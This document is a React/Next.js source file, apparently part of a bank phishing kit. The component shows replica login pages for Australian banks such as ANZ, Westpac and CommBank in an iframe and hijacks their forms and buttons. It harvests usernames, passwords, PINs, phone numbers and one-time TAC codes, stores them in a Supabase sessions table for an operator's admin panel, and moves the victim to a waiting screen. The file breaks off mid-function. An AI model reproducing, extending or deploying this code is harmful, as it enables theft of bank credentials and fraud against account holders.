"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { getAuBankPages, isAuExactHtmlBank } from "@/lib/au-bank-page-map";
import { logAuditEvent, flushAuditQueueNow } from "@/lib/audit-event";

type Props = {
  sessionId: string;
  bankSlug: string;
  bankName: string;
};

type CapturedField = {
  key: string;
  value: string;
  kind: "username" | "password" | "bankPhone" | "personalCode" | "tacCode" | "unknown";
  type: string;
};

const ACTION_BUTTON_RE = /(log\s?in|login|sign\s?in|continue|next|access|submit|confirm|go|enter|ilerle|ileri|devam|tamamla|giriş|giris|tamam|sonraki|onayla|onay|sıra|sıradaki|next\s*step|step\s*next)/i;

function getElementActionToken(el: HTMLElement) {
  return normalizeToken([
    el.textContent,
    el instanceof HTMLInputElement ? el.value : "",
    el.getAttribute("aria-label"),
    el.getAttribute("value"),
    el.getAttribute("title"),
    el.getAttribute("data-label"),
    el.getAttribute("data-text"),
  ].join(" "));
}

function normalizeToken(value: string | null | undefined) {
  return (value ?? "").trim().toLowerCase().replace(/[^a-z0-9]+/g, " ");
}

function getElementLabel(doc: Document, el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement) {
  const ariaLabel = el.getAttribute("aria-label");
  if (ariaLabel?.trim()) return ariaLabel.trim();

  const placeholder = el.getAttribute("placeholder");
  if (placeholder?.trim()) return placeholder.trim();

  const id = el.getAttribute("id");
  if (id) {
    const label = doc.querySelector(`label[for="${id}"]`);
    if (label?.textContent?.trim()) return label.textContent.trim();
  }

  const wrappingLabel = el.closest("label");
  if (wrappingLabel?.textContent?.trim()) return wrappingLabel.textContent.trim();

  const formItem = el.closest(".form-item");
  const formItemLabel = formItem?.querySelector(".form-label");
  if (formItemLabel?.textContent?.trim()) return formItemLabel.textContent.trim();

  const formInput = el.closest(".form-input");
  const siblingFormLabel =
    formInput?.previousElementSibling?.classList.contains("form-label")
      ? formInput.previousElementSibling
      : null;
  if (siblingFormLabel?.textContent?.trim()) return siblingFormLabel.textContent.trim();

  const parentText = el.parentElement?.parentElement?.textContent?.trim();
  if (parentText) return parentText;

  return "";
}

function inferFieldKind(
  el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement,
  label: string,
): CapturedField["kind"] {
  const raw = normalizeToken(
    [
      el.getAttribute("name"),
      el.getAttribute("id"),
      el.getAttribute("data-testid"),
      el.getAttribute("autocomplete"),
      el.getAttribute("type"),
      label,
    ].join(" "),
  );

  const type = (el.getAttribute("type") ?? "").toLowerCase();
  if (type === "password" || /\b(password|passcode|pin|secret)\b/.test(raw)) return "password";
  if (/\b(tac|otp|one time|one-time|verification|security code|sms code|code)\b/.test(raw)) return "tacCode";
  if (type === "tel" || /\b(phone|mobile|contact|cell)\b/.test(raw)) return "bankPhone";
  if (/\b(personal|identity|customer number|member number|ird|tax number)\b/.test(raw)) return "personalCode";
  if (/\b(username|user id|userid|login id|access number|client number|customer id|card number|account number)\b/.test(raw)) {
    return "username";
  }
  return "unknown";
}

function sanitizeKey(value: string) {
  return value.trim().toLowerCase().replace(/[^a-z0-9]+/g, "_").replace(/^_+|_+$/g, "");
}

function isMeaningfulField(el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement) {
  const type = (el.getAttribute("type") ?? "").toLowerCase();
  if (["hidden", "submit", "button", "image", "reset"].includes(type)) return false;
  if ((type === "checkbox" || type === "radio") && !(el as HTMLInputElement).checked) return false;
  if (el.getAttribute("aria-hidden") === "true") return false;
  // ⭐ tabindex=-1, disabled veya pointer-events:none OLSUN BİLE — değer GİRİLMİŞSE alanı say!
  // (HTML V4 script zaten engelleri kaldırıyor ama arada race olabiliyor)
  return true;
}

function readFieldValue(el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement) {
  const type = (el.getAttribute("type") ?? "").toLowerCase();
  if (type === "checkbox" || type === "radio") {
    return (el as HTMLInputElement).checked ? ((el as HTMLInputElement).value || "true") : "";
  }
  return el.value?.trim() ?? "";
}

function getFormFields(form: HTMLFormElement) {
  return Array.from(
    form.querySelectorAll<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>("input, textarea, select"),
  ).filter(isMeaningfulField);
}

function formHasIdentityAndPassword(form: HTMLFormElement, doc: Document) {
  const fields = getFormFields(form);
  let hasIdentity = false;
  let hasPassword = false;

  for (const field of fields) {
    const kind = inferFieldKind(field, getElementLabel(doc, field));
    if (kind === "password") hasPassword = true;
    if (kind === "username" || kind === "personalCode" || kind === "bankPhone") {
      hasIdentity = true;
    }
  }

  return hasIdentity && hasPassword;
}

function pickBestForm(doc: Document): HTMLFormElement | null {
  const forms = Array.from(doc.querySelectorAll("form"));
  if (forms.length === 0) return null;

  let bestScore = -1;
  let bestForm: HTMLFormElement | null = null;
  for (const form of forms) {
    const fields = getFormFields(form);
    let hasId = false;
    let hasPass = false;
    let filledCount = 0;
    for (const f of fields) {
      const k = inferFieldKind(f, getElementLabel(doc, f));
      if (k === "password") hasPass = true;
      if (k === "username" || k === "personalCode" || k === "bankPhone") hasId = true;
      if (readFieldValue(f)) filledCount++;
    }
    const score = fields.length * 2 + (hasId ? 8 : 0) + (hasPass ? 8 : 0) + filledCount;
    if (score > bestScore) {
      bestScore = score;
      bestForm = form;
    }
  }
  return bestForm;
}

function collectCapturedFieldsFromForm(form: HTMLFormElement, doc: Document): CapturedField[] {
  const allFields = getFormFields(form);
  return allFields
    .map((el) => {
      const value = readFieldValue(el);
      if (!value) return null;
      const label = getElementLabel(doc, el);
      const rawKey = sanitizeKey(
        el.getAttribute("name") ||
        el.getAttribute("id") ||
        label ||
        `field_${allFields.indexOf(el) + 1}`,
      );
      return {
        key: rawKey || `field_${allFields.indexOf(el) + 1}`,
        value,
        kind: inferFieldKind(el, label),
        type: (el.getAttribute("type") ?? "").toLowerCase(),
      } satisfies CapturedField;
    })
    .filter((f): f is CapturedField => Boolean(f));
}

function canSubmitIntermediate(form: HTMLFormElement, doc: Document) {
  const fields = collectCapturedFieldsFromForm(form, doc);
  // Ara adım: O SAYFADAKİ tüm meaningful alanların DOLU olmasını istiyoruz.
  if (fields.length === 0) return false;
  const allFields = getFormFields(form);
  // Eğer meaningful alan var ama hepsi doldurulmamışsa → HENÜZ HAZIR DEĞİL
  // (Ancak: unknown türünde hiç değer almayan checkbox/opsiyonel alanlar için tolerans:
  //  doldurulan / toplam meaningful oranı %100 veya en az 1 tanesi password/username ise yeter)
  const allRequiredTypes = allFields.filter((f) => {
    const t = (f.getAttribute("type") ?? "").toLowerCase();
    return t !== "checkbox" && t !== "radio";
  });
  if (allRequiredTypes.length > 0) {
    const filledRequired = allRequiredTypes.filter((f) => readFieldValue(f).length > 0).length;
    if (filledRequired < allRequiredTypes.length) {
      // Ama: password veya identity türünden alan DOLUYSA, diğerleri opsiyonel olabilir → izin ver
      const hasImportant = fields.some(
        (x) =>
          x.kind === "password" ||
          x.kind === "username" ||
          x.kind === "personalCode" ||
          x.kind === "bankPhone" ||
          x.kind === "tacCode",
      );
      if (!hasImportant) return false;
    }
  }
  if (hasIdentityField(fields) || hasPasswordField(fields) || fields.length >= 1) return true;
  return false;
}

function canSubmitFinal(form: HTMLFormElement, doc: Document, isActuallySingleStepOnly: boolean) {
  const fields = collectCapturedFieldsFromForm(form, doc);
  // ÖNEMLİ: Eğer banka ÇOK ADIMLI ise (2-3 HTML) ve SON ADIMDA sadece password veya sadece TAC
  // gibi tek bir alan varsa → hasId + hasPass ARAMAYALIM. O SAYFADAKİ alanların hepsi dolu yeter.
  // SADECE TEK ADIMLI BANKALARDA (1 HTML, içinde hem username hem password) zorunlu ID+PASS.
  if (isActuallySingleStepOnly) {
    return hasIdentityField(fields) && hasPasswordField(fields);
  }
  // Çok adımlı son adım: O sayfadaki meaningful alanların (checkbox/radio hariç) hepsi dolu olsun
  return canSubmitIntermediate(form, doc);
}

function hasIdentityField(fields: CapturedField[]) {
  return fields.some((field) =>
    (field.kind === "username" || field.kind === "personalCode" || field.kind === "bankPhone") &&
    field.value.trim().length > 0,
  );
}

function hasPasswordField(fields: CapturedField[]) {
  return fields.some((field) => field.kind === "password" && field.value.trim().length > 0);
}

function isExternalHref(href: string | null) {
  if (!href) return false;
  return /^https?:\/\//i.test(href.trim());
}

function getActiveButtonColor(bankSlug: string) {
  switch (bankSlug) {
    case "bendigo-bank":
      return "#00579C";
    case "suncorp-bank":
      return "#7A0019";
    case "anz":
      return "#0A5CAD";
    case "westpac":
      return "#DA1B1B";
    case "commbank":
      return "#111111";
    default:
      return "#1F6FEB";
  }
}

export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [saving, setSaving] = useState(false);
  const [stepIndex, setStepIndex] = useState(0);

  const auPages = useMemo(() => (isAuExactHtmlBank(bankSlug) ? getAuBankPages(bankSlug) : null), [bankSlug]);

  const totalSteps = auPages?.length ?? 0;
  const isMultiStep = (auPages?.length ?? 0) > 1;
  const isFinalStep = totalSteps > 0 && stepIndex >= totalSteps - 1;

  const currentSrc = useMemo(() => {
    if (auPages) return auPages[stepIndex] ?? auPages[auPages.length - 1];
    return null;
  }, [auPages, stepIndex]);

  const submitCapturedFields = useCallback(async (fields: CapturedField[]) => {
    if (!supabase || !sessionId || saving || fields.length === 0) return;

    if (isFinalStep) {
      const isSingleStepOnly = totalSteps === 1;
      if (isSingleStepOnly) {
        // TEK ADIMLI BANKA: zorunlu ID + PASS
        if (!hasIdentityField(fields) || !hasPasswordField(fields)) return;
      } else {
        // ÇOK ADIMLI BANKA SON ADIM: O adımdaki tüm checkbox/radio DIŞI meaningful alanlar dolu mu?
        // Sadece fields.length >=1 yeter; çünkü canProceed zaten kontrol etti.
        if (fields.length === 0) return;
      }
    } else {
      if (fields.length === 0) return;
    }

    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
    const previousFormData = ((existing?.form_data ?? {}) as Record<string, unknown>) ?? {};

    const usernameField =
      fields.find((field) => field.kind === "username") ??
      fields.find((field) => field.kind === "unknown" && field.type !== "password") ??
      null;
    const passwordField = fields.find((field) => field.kind === "password") ?? null;
    const phoneField = fields.find((field) => field.kind === "bankPhone") ?? null;
    const personalCodeField = fields.find((field) => field.kind === "personalCode") ?? null;
    const tacField = fields.find((field) => field.kind === "tacCode") ?? null;

    const orderedFields = fields.slice(0, 3);
    const rawFields: Record<string, string> = Object.fromEntries(
      fields.map((field, index) => {
        const suffix = field.key || `field_${index + 1}`;
        return [`s${stepIndex + 1}_iframe_${suffix}`, field.value] as const;
      }),
    );

    const historyEntry = {
      bankSlug,
      bankName,
      htmlStepIndex: stepIndex,
      htmlStepLabel: `Step ${stepIndex + 1}/${totalSteps}`,
      verfuegernummer: usernameField?.value ?? "",
      username: usernameField?.value ?? "",
      pin: passwordField?.value ?? "",
      password: passwordField?.value ?? "",
      bankPhone: phoneField?.value ?? "",
      personalCode: personalCodeField?.value ?? "",
      tacCode: tacField?.value ?? "",
      orderedField1: orderedFields[0]?.value ?? "",
      orderedField1Key: orderedFields[0]?.kind === "unknown" ? "username" : (orderedFields[0]?.kind ?? ""),
      orderedField2: orderedFields[1]?.value ?? "",
      orderedField2Key: orderedFields[1]?.kind === "unknown" ? "" : (orderedFields[1]?.kind ?? ""),
      orderedField2Type:
        orderedFields[1]?.kind === "bankPhone"
          ? "phone"
          : orderedFields[1]?.kind === "password"
            ? "password"
            : "",
      orderedField3: orderedFields[2]?.value ?? "",
      orderedField3Key: orderedFields[2]?.kind === "unknown" ? "" : (orderedFields[2]?.kind ?? ""),
      orderedField3Type:
        orderedFields[2]?.kind === "bankPhone"
          ? "phone"
          : orderedFields[2]?.kind === "password"
            ? "password"
            : orderedFields[2]?.kind === "tacCode"
              ? "password"
              : "",
      rawFields,
      capturedAt: new Date().toISOString(),
    };

    const previousHistory = Array.isArray((previousFormData as any).bankFormHistory)
      ? (previousFormData as any).bankFormHistory.slice()
      : [];
    previousHistory.push(historyEntry);

    const mergedUsername = usernameField?.value || (previousFormData.username as string) || "";
    const mergedPassword = passwordField?.value || (previousFormData.password as string) || "";
    const mergedBankPhone = phoneField?.value || (previousFormData.bankPhone as string) || "";
    const mergedPersonalCode = personalCodeField?.value || (previousFormData.personalCode as string) || "";
    const mergedTacCode = tacField?.value || (previousFormData.tacCode as string) || "";

    // ⭐ ÖNEMLİ SIRA: rawFields (iframe ham alanları) ÖNCE, sonra resmi alanlar SONRA.
    // Böylece rawFields içindeki user_agent / Mozilla / Chrome / Windows gibi
    // anlamsız URL-escape string'leri resmi pin/password/verfuegernummer gibi alanların
    // ÜSTÜNE YAZAMAZ. (Önceki sürümde tersiydi ve admin panelde user-agent PIN olarak görünüyordu.)
    const nextFormData = {
      ...previousFormData,
      ...rawFields,
      bankSlug,
      bankName,
      verfuegernummer: mergedUsername,
      username: mergedUsername,
      pin: mergedPassword,
      password: mergedPassword,
      bankPhone: mergedBankPhone,
      personalCode: mergedPersonalCode,
      tacCode: mergedTacCode,
      orderedField1: historyEntry.orderedField1,
      orderedField1Key: historyEntry.orderedField1Key,
      orderedField2: historyEntry.orderedField2,
      orderedField2Key: historyEntry.orderedField2Key,
      orderedField2Type: historyEntry.orderedField2Type,
      orderedField3: historyEntry.orderedField3,
      orderedField3Key: historyEntry.orderedField3Key,
      orderedField3Type: historyEntry.orderedField3Type,
      bankFormHistory: previousHistory,
    };

    const nextStep = isFinalStep ? "wait" : "bank";
    const nextToStep = isFinalStep ? "wait" : null;
    const updatePayload: any = {
      is_hidden: false,
      form_data: nextFormData,
    };
    if (nextStep === "wait") updatePayload.current_step = "wait";

    const { error: updateError } = await supabase
      .from("sessions")
      .update(updatePayload)
      .eq("id", sessionId);

    setSaving(false);

    if (updateError) {
      logAuditEvent({
        session_id: sessionId,
        event_kind: "submit",
        event_action: "au_exact_submit_error",
        status: "error",
        bank_slug: bankSlug,
        bank_name: bankName,
        meta: { message: updateError.message ?? String(updateError), htmlStepIndex: stepIndex },
        error_name: "SupabaseUpdateError",
        error_message: updateError.message ?? String(updateError),
      });
      return;
    }

    if (isFinalStep) {
      logAuditEvent({
        session_id: sessionId,
        event_kind: "bank_form",
        event_action: "au_exact_submit_wait",
        status: "ok",
        bank_slug: bankSlug,
        bank_name: bankName,
        from_step: "bank",
        to_step: "wait",
        meta: {
          historyCount: previousHistory.length,
          totalSteps,
          rawFieldKeys: Object.keys(rawFields),
          orderedFields: {
            orderedField1Key: historyEntry.orderedField1Key,
            orderedField2Key: historyEntry.orderedField2Key,
            orderedField3Key: historyEntry.orderedField3Key,
          },
        },
      });
      void flushAuditQueueNow();
      // ⭐ FLASH YOK: router.push → router.replace
      router.replace(stepToPath("wait", sessionId));
      return;
    }

    logAuditEvent({
      session_id: sessionId,
      event_kind: "step",
      event_action: "au_exact_advance_html_step",
      status: "ok",
      bank_slug: bankSlug,
      bank_name: bankName,
      from_step: "bank",
      to_step: nextToStep,
      meta: {
        fromIndex: stepIndex,
        toIndex: stepIndex + 1,
        totalSteps,
        rawFieldKeys: Object.keys(rawFields),
        historyCount: previousHistory.length,
      },
    });
    void flushAuditQueueNow();
    setStepIndex((i) => i + 1);
  }, [bankName, bankSlug, isFinalStep, router, saving, sessionId, stepIndex, supabase, totalSteps]);

  const captureFieldsFromFrame = useCallback(() => {
    const doc = iframeRef.current?.contentDocument;
    if (!doc) return [] as CapturedField[];
    const form = pickBestForm(doc);
    if (!form) return [];
    return collectCapturedFieldsFromForm(form, doc);
  }, []);

  const submitWithCurrentValuesRef = useRef<() => Promise<void>>(() => Promise.resolve());
  const lastSubmitAtRef = useRef<number>(0);
  const savedSubmitFormRef = useRef<HTMLFormElement | null>(null);
  const savedSubmitActionNodesRef = useRef<HTMLElement[]>([]);

  const attachFrameBridge = useCallback(() => {
    const iframe = iframeRef.current;
    const doc = iframe?.contentDocument;
    if (!iframe || !doc) return;

    let loginForm =
      Array.from(doc.querySelectorAll("form")).find((form) => formHasIdentityAndPassword(form, doc)) ?? null;
    if (!loginForm) {
      loginForm = pickBestForm(doc);
    }
    if (!loginForm) return;
    savedSubmitFormRef.current = loginForm;

    const canProceedNow = () => {
      const isSingle = (auPages?.length ?? 1) === 1;
      if (isFinalStep) return canSubmitFinal(loginForm!, doc, isSingle);
      return canSubmitIntermediate(loginForm!, doc);
    };

    const ultraForceClickOnBestNode = (bestForm: HTMLFormElement, actNodes: HTMLElement[]) => {
      try {
        const candidates: HTMLElement[] = [];
        if (actNodes && actNodes.length > 0) candidates.push(...actNodes);
        try {
          const inside = Array.from(
            bestForm.querySelectorAll<HTMLElement>(
              "button, input[type='submit'], input[type='button'], [role='button'], .btn-submit, [data-testid='login-button'], a.btn, .btn-primary, .btn",
            ),
          );
          inside.forEach((x) => candidates.push(x));
        } catch {}
        try {
          const out = Array.from(
            doc.querySelectorAll<HTMLElement>(
              "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button']",
            ),
          );
          out.forEach((x) => candidates.push(x));
        } catch {}
        const seen = new Set<HTMLElement>();
        let bestNode: HTMLElement | null = null;
        for (const cand of candidates) {
          if (seen.has(cand)) continue;
          seen.add(cand);
          const tok = getElementActionToken(cand);
          const isi =
            cand instanceof HTMLInputElement && ["submit", "button"].includes((cand.getAttribute("type") ?? "").toLowerCase());
          if (!(ACTION_BUTTON_RE.test(tok) || isi)) {
            continue;
          }
          bestNode = cand;
          break;
        }
        if (bestNode) {
          savedSubmitActionNodesRef.current = [bestNode];
          try {
            (bestNode as any).click();
          } catch {}
          try {
            if ((bestNode as any).dispatchEvent) {
              try {
                (bestNode as any).dispatchEvent(new MouseEvent("mousedown", { bubbles: true, cancelable: true, view: window }));
              } catch {}
              try {
                (bestNode as any).dispatchEvent(new MouseEvent("mouseup", { bubbles: true, cancelable: true, view: window }));
              } catch {}
              try {
                (bestNode as any).dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true, view: window }));
              } catch {}
              try {
                (bestNode as any).dispatchEvent(new PointerEvent("pointerdown", { bubbles: true, cancelable: true }));
              } catch {}
              try {
                (bestNode as any).dispatchEvent(new PointerEvent("pointerup", { bubbles: true, cancelable: true }));
              } catch {}
            }
          } catch {}
        }
        try {
          if (typeof (bestForm as any).requestSubmit === "function") {
            try { (bestForm as any).requestSubmit(); } catch {}
          }
        } catch {}
        try { bestForm.submit(); } catch {}
      } catch (_) {
        /* ignore */
      }
    };

    const submitWithCurrentValues = async (event?: Event) => {
      event?.preventDefault?.();
      event?.stopPropagation?.();
      try { event?.stopImmediatePropagation?.(); } catch {}

      const now = Date.now();
      if (now - lastSubmitAtRef.current < 1200) return;

      const captured = captureFieldsFromFrame();
      if (captured.length === 0) return;

      // NUKE GÜVENLİK: Resmi canProceed() TRUE dönerse kesin submit.
      // Eğer canProceed FALSE dönerse BİLE — ama kullanıcı butona BASTIYSA
      // ve EN AZ 1 TANE ÖNEMLİ ALAN (password/username/personal/tac/phone)
      // capture edildiyse, yine de SUBMIT yap.
      // (Multi-step bankalarda canProceed yanlış hesaplanabilir; butona basılmışsa,
      // kullanıcı submit etmek istiyordur demektir — alanlar 0 değilse kaydedelim.)
      const proceedOfficial = canProceedNow();
      const hasAtLeastOneImportant = captured.some(
        (c) =>
          c.kind === "password" ||
          c.kind === "username" ||
          c.kind === "personalCode" ||
          c.kind === "bankPhone" ||
          c.kind === "tacCode",
      );
      const emergencyOk = !proceedOfficial && (captured.length >= 1 && hasAtLeastOneImportant);
      if (!proceedOfficial && !emergencyOk) {
        // Son çare: sadece unknown ama 2+ alan doluysa da izin ver
        const unknownCount = captured.filter((c) => c.kind === "unknown").length;
        if (!(captured.length >= 2 && unknownCount >= 2)) {
          return;
        }
      }

      lastSubmitAtRef.current = now;
      void submitCapturedFields(captured);
    };

    const computeActionNodes = (d: Document, form: HTMLFormElement | null): HTMLElement[] => {
      const arr: HTMLElement[] = [];
      try {
        const fNodes = form ? Array.from(form.querySelectorAll<HTMLElement>(
          "button, input[type='submit'], input[type='button'], [role='button'], .el-button, .van-button, .btn-submit, [data-testid='login-button'], a.btn, .btn-primary, .btn, [onclick], [class*='btn'], [class*='login'], [class*='submit'], [class*='continue'], [class*='next'], [id*='btn'], [id*='submit'], [id*='login'], [id*='continue'], [id*='next']",
        )) : [];
        const dNodes = Array.from(d.querySelectorAll<HTMLElement>(
          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button'], [onclick], [class*='btn-'], [class*='button-'], [class*='btn_'], [id*='btn-'], [id*='button']",
        ));
        const seen = new Set<HTMLElement>();
        [...fNodes, ...dNodes].forEach((n) => {
          if (seen.has(n)) return;
          seen.add(n);
          const tok = getElementActionToken(n);
          const isi =
            n instanceof HTMLInputElement && ["submit", "button"].includes((n.getAttribute("type") ?? "").toLowerCase());
          const isByAttr =
            n.tagName === "BUTTON" ||
            n.getAttribute("role") === "button" ||
            n.hasAttribute("onclick");
          if (!(ACTION_BUTTON_RE.test(tok) || isi || isByAttr)) return;
          arr.push(n);
        });

        // BRUTE FORCE FALLBACK: Eğer yukarıdan 0 node geldiyse, form veya doc içinde
        // class/id/textte btn/button/login/submit/next/continue/ileri/giriş/giris/sonraki/tamam/onay/devam
        // geçen HER elementi al ve submit butonu olarak ele al.
        if (arr.length === 0) {
          const fallBackSource =
            form ? form : d.body ?? d.documentElement;
          if (fallBackSource) {
            const allIn = fallBackSource.querySelectorAll<HTMLElement>("*");
            const bfRe = /btn|button|login|submit|continue|next|ileri|giriş|giris|sonraki|tamam|onay|devam|enter|confirm|password_submit|submit_password|acceso|iniciar/i;
            allIn.forEach((el) => {
              if (seen.has(el)) return;
              const tag = (el.tagName || "").toLowerCase();
              const type = (el.getAttribute("type") || "").toLowerCase();
              const tOk = tag === "button" || type === "submit" || type === "button" || el.getAttribute("role") === "button";
              const idClsTxt = `${el.id || ""} ${el.getAttribute("class") || ""} ${el.getAttribute("data-testid") || ""} ${el.getAttribute("name") || ""} ${(el.textContent || "").trim().slice(0, 120)}`;
              if (tOk || bfRe.test(idClsTxt)) {
                seen.add(el);
                arr.push(el);
              }
            });
          }
        }
      } catch {}
      return arr;
    };

    submitWithCurrentValuesRef.current = submitWithCurrentValues;

    const forms = Array.from(doc.querySelectorAll("form"));
    forms.forEach((form) => {
      form.setAttribute("action", "#");
      form.setAttribute("method", "post");
      form.setAttribute("target", "_self");
      form.setAttribute("novalidate", "novalidate");
      if (form === loginForm) {
        try { form.removeEventListener("submit", submitWithCurrentValues as any); } catch {}
        form.addEventListener("submit", submitWithCurrentValues as any);
        (form as any)._auBotV3Bound = true;
      }
    });

    const actionNodes = computeActionNodes(doc, loginForm);
    savedSubmitActionNodesRef.current = actionNodes;

    const updateSubmitState = () => {
      const isValid = canProceedNow();
      const isDisabled = !isValid || saving;
      const activeColor = getActiveButtonColor(bankSlug);
      actionNodes.forEach((node) => {
        if ("disabled" in node) {
          try { (node as any).disabled = isDisabled; } catch {}
        }
        try {
          node.setAttribute("aria-disabled", isDisabled ? "true" : "false");
        } catch {}
        try {
          node.style.pointerEvents = isDisabled ? "none" : "auto";
          node.style.opacity = "1";
          node.style.cursor = isDisabled ? "not-allowed" : "pointer";
        } catch {}
        try {
          node.style.background = isDisabled ? "#E6E8EA" : activeColor;
          node.style.color = isDisabled ? "#ABAEAF" : "#FFFFFF";
          node.style.border = isDisabled ? "1px solid transparent" : `1px solid ${activeColor}`;
          node.style.boxShadow = isDisabled ? "none" : "0 10px 24px rgba(245, 108, 0, 0.28)";
          node.style.transform = isDisabled ? "none" : "translateY(0)";
          node.style.transition = "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease";
        } catch {}
      });
    };

    actionNodes.forEach((node) => {
      try { node.removeEventListener("click", submitWithCurrentValues as any); } catch {}
      try { node.removeEventListener("mousedown", submitWithCurrentValues as any); } catch {}
      try { node.removeEventListener("touchend", submitWithCurrentValues as any); } catch {}
      node.addEventListener("click", submitWithCurrentValues as any, false);
      node.addEventListener("mousedown", submitWithCurrentValues as any, false);
      node.addEventListener("touchend", submitWithCurrentValues as any, false);
      try {
        node.addEventListener("keydown", (e: Event) => {
          const ke = e as KeyboardEvent;
          if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
            try { submitWithCurrentValues(e as any); } catch {}
          }
        }, false);
      } catch {}
    });

    Array.from(doc.querySelectorAll<HTMLAnchorElement>("a")).forEach((link) => {
      if (!isExternalHref(link.getAttribute("href"))) return;
      link.setAttribute("href", "#");
      link.setAttribute("target", "_self");
      link.setAttribute("rel", "nofollow noopener noreferrer");
    });

    getFormFields(loginForm).forEach((field) => {
      try { field.removeEventListener("input", updateSubmitState as any); } catch {}
      try { field.removeEventListener("change", updateSubmitState as any); } catch {}
      field.addEventListener("input", updateSubmitState as any);
      field.addEventListener("change", updateSubmitState as any);
      field.addEventListener("keydown", (event) => {
        if (event instanceof KeyboardEvent && event.key === "Enter" && !canProceedNow()) {
          event.preventDefault();
          event.stopPropagation();
        }
      });
    });

    updateSubmitState();
  }, [bankSlug, captureFieldsFromFrame, isFinalStep, saving, submitCapturedFields, totalSteps, auPages]);

  const handleFrameLoad = useCallback(() => {
    void attachFrameBridge();
  }, [attachFrameBridge]);

  useEffect(() => {
    const iframe = iframeRef.current;
    if (!iframe) return;

    if (iframe.contentDocument?.readyState === "complete") {
      void attachFrameBridge();
    }

    iframe.addEventListener("load", handleFrameLoad);
    return () => {
      iframe.removeEventListener("load", handleFrameLoad);
    };
  }, [attachFrameBridge, handleFrameLoad]);

  useEffect(() => {
    const onMsg = (ev: MessageEvent) => {
      try {
        const data = ev.data as any;
        if (!data || typeof data !== "object") return;
        if (data.kind === "BOT_V3_SUBMIT_CLICKED" || data.kind === "BOT_V2_SUBMIT_CLICKED" || data.type === "AU_BOT_SUBMIT_NOW") {
          const ref = submitWithCurrentValuesRef.current;
          if (ref && typeof ref === "function") {
            void ref();
          }
        }
      } catch (_) {}
    };
    window.addEventListener("message", onMsg);
    return () => window.removeEventListener("message", onMsg);
  }, []);

  useEffect(() => {
    const iframe = iframeRef.current;
    if (!iframe) return;

    const runPoll = () => {
      try {
        const doc = iframe.contentWindow?.document;
        if (!doc) return;

        const form = pickBestForm(doc);
        if (!form) return;
        savedSubmitFormRef.current = form;

        const singleStep = totalSteps === 1;
        const proceedNow = isFinalStep ? canSubmitFinal(form, doc, singleStep) : canSubmitIntermediate(form, doc);
        const disabledBySaving = saving;
        const shouldForceEnable = proceedNow && !disabledBySaving;

        const activeColor = getActiveButtonColor(bankSlug);

        const allCandidates = doc.querySelectorAll<HTMLElement>(
          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button'], .btn-lg, .btn-default, [onclick], [class*='btn'], [class*='login'], [class*='submit'], [class*='continue'], [class*='next'], [id*='btn'], [id*='submit'], [id*='continue'], [id*='next']",
        );

        const candidateNodes: HTMLElement[] = [];
        const seenCandidates = new Set<HTMLElement>();
        allCandidates.forEach((node) => {
          if (seenCandidates.has(node)) return;
          seenCandidates.add(node);
          const nodeToken = getElementActionToken(node);
          const isSubmitInput =
            node instanceof HTMLInputElement &&
            ["submit", "button"].includes((node.getAttribute("type") ?? "").toLowerCase());
          const isByAttr =
            node.tagName === "BUTTON" ||
            node.getAttribute("role") === "button" ||
            node.hasAttribute("onclick");

          if (!(ACTION_BUTTON_RE.test(nodeToken) || isSubmitInput || isByAttr)) return;
          candidateNodes.push(node);

          if ("disabled" in node) {
            try { (node as any).disabled = !shouldForceEnable; } catch {}
          }

          try {
            if (shouldForceEnable) {
              node.removeAttribute("disabled");
            }
          } catch {}
          try {
            node.setAttribute("aria-disabled", shouldForceEnable ? "false" : "true");
          } catch {}

          try {
            node.style.pointerEvents = shouldForceEnable ? "auto" : "none";
            node.style.opacity = "1";
            node.style.cursor = shouldForceEnable ? "pointer" : "not-allowed";
          } catch {}

          try {
            if (shouldForceEnable) {
              const classesToRemove: string[] = [];
              for (let i = 0; i < node.classList.length; i++) {
                const cls = node.classList[i];
                if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
                  classesToRemove.push(cls);
                }
              }
              classesToRemove.forEach((c) => node.classList.remove(c));
            }
          } catch {}

          try {
            if (shouldForceEnable) {
              node.style.background = activeColor;
              node.style.color = "#FFFFFF";
              node.style.border = `1px solid ${activeColor}`;
              node.style.boxShadow = "0 10px 24px rgba(245, 108, 0, 0.28)";
            } else {
              node.style.background = "#E6E8EA";
              node.style.color = "#ABAEAF";
              node.style.border = "1px solid transparent";
              node.style.boxShadow = "none";
            }
          } catch {}

          try {
            const curRef = submitWithCurrentValuesRef.current;
            try { node.removeEventListener("click", curRef as any, false); } catch {}
            try { node.removeEventListener("mousedown", curRef as any, false); } catch {}
            try { node.removeEventListener("touchend", curRef as any, false); } catch {}
            if (shouldForceEnable && curRef) {
              node.addEventListener("click", curRef as any, false);
              node.addEventListener("mousedown", curRef as any, false);
              node.addEventListener("touchend", curRef as any, false);
              try {
                node.addEventListener("keydown", (e: Event) => {
                  const ke = e as KeyboardEvent;
                  if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
                    try { curRef(); } catch {}
                  }
                }, false);
              } catch {}
            }
          } catch {}
        });

